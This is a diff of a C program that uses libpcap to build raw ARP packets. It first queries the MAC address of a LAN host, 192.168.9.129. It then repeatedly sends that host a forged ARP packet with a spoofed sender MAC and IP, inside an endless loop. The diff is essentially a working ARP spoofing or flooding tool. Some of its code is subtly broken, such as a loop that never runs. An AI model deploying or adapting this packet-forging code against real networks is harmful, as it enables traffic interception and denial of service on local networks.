@@ -3,11 +3,17 @@
 #include <stdint.h>
 #include <arpa/inet.h>
 #include <netinet/ip.h>
-#include "net/if.h"
 #include <string.h>
+#include <sys/socket.h>
+#include <sys/ioctl.h>
+#include <sys/time.h>
+#include "net/if.h"
 #include "sys/ioctl.h"
-
-
+#include <netdb.h>
+#include <ifaddrs.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
 
 typedef struct ether_header
 {
@@ -18,8 +24,7 @@ typedef struct ether_header
 
 }ether_t;
 
-
-typedef struct arphdr
+typedef struct arp_header
 {
 
     uint16_t htype;
@@ -125,7 +130,7 @@ int main(int argc, char * argv[])
 
     int number, i;
 
-    u_char packet[60];
+    int domains[] = { AF_INET, AF_INET6 };
 
 
     bzero( (void *)&cMacAddr[0], sizeof(cMacAddr) );
@@ -134,7 +139,7 @@ int main(int argc, char * argv[])
         // We failed to get the local host's MAC address
         printf( "Fatal error: Failed to get local host's MAC address\n" );
     }
-    printf( "HWaddr %02X:%02X:%02X:%02X:%02X:%02X\n",
+    printf( "HOST MAC ADDRESS: %02X:%02X:%02X:%02X:%02X:%02X\n",
             cMacAddr[0], cMacAddr[1], cMacAddr[2],
             cMacAddr[3], cMacAddr[4], cMacAddr[5] );
 
@@ -142,6 +147,7 @@ int main(int argc, char * argv[])
 
 
     uint8_t gatemac[6];
+    uint8_t targetmac[6];
 
     arphdr_t* arpheader;
     ether_t *etherheader;
@@ -161,46 +167,55 @@ int main(int argc, char * argv[])
     }
 
 
+    u_char packet[42];
+
     for(i=0; i<6; i++)packet[i]=255; // 0xFF
 
-    packet[6]=0;
-    packet[7]=80;
-    packet[8]=86;
-    packet[9]=225;
-    packet[10]=216;
-    packet[11]=128;
-    packet[12]=8;
-    packet[13]=6;
-    //eth setting
-    packet[14]=0;
-    packet[15]=1;
-    packet[16]=8;
-    packet[17]=0;
-    packet[18]=6;
-    packet[19]=4;
-    packet[20]=0;
-    packet[21]=1;
-    for(int i=22;i<28;i++)
-        packet[i]=packet[i-16];
-    //senderip
+    packet[6]= cMacAddr[0]; //HOST MAC
+    packet[7]= cMacAddr[1];
+    packet[8]= cMacAddr[2];
+    packet[9]= cMacAddr[3];
+    packet[10]= cMacAddr[4];
+    packet[11]= cMacAddr[5];
+
+    packet[12]= 8;
+    packet[13]= 6;
+
+    packet[14]= 0;
+    packet[15]= 1;
+    packet[16]= 8; //IPv4 0x0800
+    packet[17]= 0;
+    packet[18]= 6; //Hardware size 0x06
+    packet[19]= 4; //Protocol size 0x04
+    packet[20]= 0;
+    packet[21]= 1; //Resquest
+
+    for(int i=22;i<28;i++)packet[i]=packet[i-16]; //Sender MAC address
+
     packet[28]=192;
     packet[29]=168;
-    packet[30]=92;
-    packet[31]=2;
-    for(int i=32;i<6;i++)
-        packet[i]=0;
+    packet[30]=9;
+    packet[31]=128;
+
+    for(int i=32;i<6;i++)packet[i]=0;
+
+    packet[32]= 0x00;
+    packet[33]= 0x0C;
+    packet[34]= 0x29;
+    packet[35]= 0xB6;
+    packet[36]= 0xAD;
+    packet[37]= 0x1E;
+
     packet[38]=192;
     packet[39]=168;
-    packet[40]=92;
-    packet[41]=137;
+    packet[40]=9;
+    packet[41]=129;
 
 
-
-    if (pcap_sendpacket(handle, packet, sizeof( packet )) != 0)
+    if (pcap_sendpacket(handle ,packet ,sizeof(packet)) != 0)
     {
         printf("Packet sending Failure\n");
     }
-
 
     else
     {
@@ -213,24 +228,70 @@ int main(int argc, char * argv[])
                 continue;
             }
 
-
             if(packet != NULL)
             {
                 etherheader=(ether_t*)packet;
 
-
                 if(ntohs(etherheader->type)==1544)
                 {
                     arpheader=(arphdr_t*)(packet+14);
-
-                    for(int i=0;i<6;i++)gatemac[i]=arpheader->sha[i];
-                    for(i=0; i<6; i++)printf("Gate MAC: %02x", gatemac[i]);
+                    for(int i=0;i<6;i++)targetmac[i]=arpheader->sha[i];
+                    for(i=0; i<6; i++)printf("TARGET MAC: %02x", targetmac[i]);
                 }
             }
         }
     }
 
+    packet[0]= targetmac[0];
+    packet[1]= targetmac[1];
+    packet[2]= targetmac[2];
+    packet[3]= targetmac[3];
+    packet[4]= targetmac[4];
+    packet[5]= targetmac[5];
+
+    packet[6]= cMacAddr[0]; //HOST MAC
+    packet[7]= cMacAddr[1];
+    packet[8]= cMacAddr[2];
+    packet[9]= cMacAddr[3];
+    packet[10]= cMacAddr[4];
+    packet[11]= cMacAddr[5];
+
+    packet[12]= 8;
+    packet[13]= 6;
+
+    packet[14]= 0;
+    packet[15]= 1;
+    packet[16]= 8; //IPv4 0x0800
+    packet[17]= 0;
+    packet[18]= 6; //Hardware size 0x06
+    packet[19]= 4; //Protocol size 0x04
+    packet[20]= 0;
+    packet[21]= 1; //Resquest
+
+    for(int i=0;i<5;i++)packet[i+22]=targetmac[i];
+    packet[27]= 0x01;
+
+    packet[28]=192;
+    packet[29]=168;
+    packet[30]=9;
+    packet[31]=128;
+
+    for(int i=0;i<6;i++)packet[i+32]=targetmac[i];
+
+    packet[38]=192;
+    packet[39]=168;
+    packet[40]=9;
+    packet[41]=129;
+
+
+    while(1)
+    {
+        if (pcap_sendpacket(handle ,packet ,sizeof(packet)) != 0)
+            printf("Packet sending Failure\n");
+    }
+
     return 0;
 }
+
 
 
